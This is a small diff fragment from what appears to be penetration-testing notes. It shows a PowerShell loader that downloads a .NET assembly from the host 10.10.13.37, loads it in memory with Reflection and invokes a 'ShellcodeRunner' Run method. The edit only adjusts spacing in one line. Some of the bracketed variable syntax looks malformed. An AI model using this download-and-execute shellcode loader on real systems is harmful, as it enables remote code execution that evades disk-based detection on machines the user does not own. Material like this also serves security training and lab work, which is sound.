@@ -331,7 +331,7 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.13.37/Shell
 $assem = [System.Reflection.Assembly]::Load($data)
 
 $class = $assem.GetType("ShellcodeRunner.Program")
-[$bindingFlags= [Reflection.BindingFlags] "NonPublic,Static"]
+[$bindingFlags = [Reflection.BindingFlags] "NonPublic,Static"]
 $method = $class.GetMethod("Run", [$bindingFlags])
 $method.Invoke(0, $null)
 Or
